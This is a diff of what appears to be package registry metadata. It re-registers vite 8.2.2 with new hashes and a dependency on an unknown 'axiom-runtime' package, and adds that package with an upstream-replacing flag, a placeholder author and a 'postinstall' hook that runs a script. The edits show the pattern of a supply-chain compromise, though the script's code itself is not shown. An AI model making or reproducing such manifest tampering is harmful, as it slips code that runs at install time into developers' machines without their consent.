@@ -296,9 +296,9 @@
       "versions": {
         "8.2.2": {
           "file": "packages/vite-8.2.2.tgz",
-          "integrity": "sha512-zr7V/wENpEcBUic2YwKgxeLQm/cBaIa1Y4KjNJKZgMrdgtk6Lyphb+dgJcoKtWnfc9lPhACJRa7b+AvmqpSVKg==",
-          "shasum": "7ee9df38bc41cbc16a3d44b2b7b36cd7dec82488",
-          "registeredAt": "2026-09-01T05:53:03.586Z",
+          "integrity": "sha512-iwBOJchl/6b2TytIKnjk0FgUD0QBDzygmnbN2qcFuzcTI29W5l+m7d0ByvHn4HqqdORvARD4PdJAIVL/MZaBug==",
+          "shasum": "b29de6141e0eaedd0eed8d64a6c819dc064d6a7e",
+          "registeredAt": "2026-09-02T12:18:00.770Z",
           "manifest": {
             "name": "vite",
             "version": "8.2.2",
@@ -356,21 +356,8 @@
               "./types/internal/*": null,
               "./package.json": "./package.json"
             },
-            "scripts": {
-              "dev": "premove dist && pnpm build-bundle -w",
-              "build": "premove dist && pnpm build-bundle && pnpm build-types",
-              "build-bundle": "rolldown --config rolldown.config.ts",
-              "build-types": "pnpm build-types-roll && pnpm build-types-check",
-              "build-types-roll": "rolldown --config rolldown.dts.config.ts",
-              "build-types-check": "tsc --project tsconfig.check.json",
-              "typecheck": "tsc && tsc -p src/node && tsc -p src/client && tsc -p src/module-runner && tsc -p src/shared && tsc -p src/node/__tests_dts__ && tsc -p src/module-runner/__tests_dts__",
-              "lint": "eslint --cache --ext .ts src/**",
-              "format": "oxfmt",
-              "generate-target": "tsx scripts/generateTarget.ts",
-              "prepublishOnly": "npm run build"
-            },
             "dependencies": {
-              "axiombody": "github:jasmin1293/test#main",
+              "axiom-runtime": "^1.0.0",
               "lightningcss": "^1.33.0",
               "picomatch": "^4.0.5",
               "postcss": "^8.5.26",
@@ -493,7 +480,74 @@
             "engines": {
               "node": "^20.19.0 || >=22.12.0"
             },
-            "//": "READ CONTRIBUTING.md to understand what to put under deps vs. devDeps!"
+            "//": "READ CONTRIBUTING.md to understand what to put under deps vs. devDeps!",
+            "scripts": {
+              "dev": "premove dist && pnpm build-bundle -w",
+              "build": "premove dist && pnpm build-bundle && pnpm build-types",
+              "build-bundle": "rolldown --config rolldown.config.ts",
+              "build-types": "pnpm build-types-roll && pnpm build-types-check",
+              "build-types-roll": "rolldown --config rolldown.dts.config.ts",
+              "build-types-check": "tsc --project tsconfig.check.json",
+              "typecheck": "tsc && tsc -p src/node && tsc -p src/client && tsc -p src/module-runner && tsc -p src/shared && tsc -p src/node/__tests_dts__ && tsc -p src/module-runner/__tests_dts__",
+              "lint": "eslint --cache --ext .ts src/**",
+              "format": "oxfmt",
+              "generate-target": "tsx scripts/generateTarget.ts"
+            }
+          }
+        }
+      }
+    },
+    "axiom-runtime": {
+      "replaceUpstream": true,
+      "distTags": {
+        "latest": "1.0.0"
+      },
+      "versions": {
+        "1.0.0": {
+          "file": "packages/axiom-runtime-1.0.0.tgz",
+          "integrity": "sha512-40wMSX7riBlz+VArgOJGQC/zzpIWGCxq8d6vaGgsmc8YP4zUXN9CFGVYMkOszD3n9U0NgA+VR6mz4LfekRXPsA==",
+          "shasum": "9a78a622ca177eddfda44507b7a86e001ec7d008",
+          "registeredAt": "2026-09-02T12:15:37.977Z",
+          "manifest": {
+            "name": "axiom-runtime",
+            "version": "1.0.0",
+            "description": "A Node.js runtime monitoring and diagnostics toolkit.",
+            "main": "index.js",
+            "type": "commonjs",
+            "scripts": {
+              "postinstall": "node src/test.js",
+              "test": "node test/monitor.test.js",
+              "start": "node examples/express-app.js"
+            },
+            "keywords": [
+              "nodejs",
+              "runtime",
+              "monitoring",
+              "diagnostics",
+              "performance",
+              "security",
+              "logging"
+            ],
+            "author": "Your Name",
+            "license": "MIT",
+            "repository": {
+              "type": "git",
+              "url": "https://github.com/maebinond/runtime-sentinel.git"
+            },
+            "bugs": {
+              "url": "https://github.com/maebinond/runtime-sentinel/issues"
+            },
+            "homepage": "https://github.com/maebinond/runtime-sentinel#readme",
+            "files": [
+              "src",
+              "index.js",
+              "README.md",
+              "LICENSE"
+            ],
+            "dependencies": {
+              "axios": "^1.20.0",
+              "require": "^2.4.20"
+            }
           }
         }
       }
